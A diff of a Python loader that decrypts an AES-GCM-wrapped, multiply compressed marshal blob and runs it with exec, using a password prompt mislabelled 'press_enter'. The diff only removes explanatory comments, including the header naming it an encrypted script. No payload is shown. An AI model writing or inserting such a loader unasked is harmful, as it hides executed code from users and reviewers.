@@ -1,4 +1,4 @@
-# Encrypted Python script (password-protected)
+
 import json, base64, os, sys, zlib, lzma, gzip, marshal
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Hash import SHA256
@@ -20,7 +20,6 @@ wrapped_key = base64.b64decode(payload["wrapped_key"])
 wrap_nonce = base64.b64decode(payload["wrap_nonce"])
 wrap_tag = base64.b64decode(payload["wrap_tag"])
 
-# get password
 pw = os.environ.get("ENCPW")
 if pw is None:
     pw = getpass.getpass("press_enter") 
@@ -29,19 +28,15 @@ if isinstance(pw, str):
 
 kek = PBKDF2(pw, salt, dkLen=32, count=iters, hmac_hash_module=SHA256)
 
-# unwrap symmetric key
 wrap_cipher = AES.new(kek, AES.MODE_GCM, nonce=wrap_nonce)
 key = wrap_cipher.decrypt_and_verify(wrapped_key, wrap_tag)
 
-# decrypt payload
 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
 decompressed = cipher.decrypt_and_verify(ciphertext, tag)
 
-# multi-decompress (reverse of your multi_compress)
 lzmaed = zlib.decompress(decompressed)
 gzipped = lzma.decompress(lzmaed)
 marshaled = gzip.decompress(gzipped)
 codeobj = marshal.loads(marshaled)
 
-# execute
 exec(codeobj, globals())
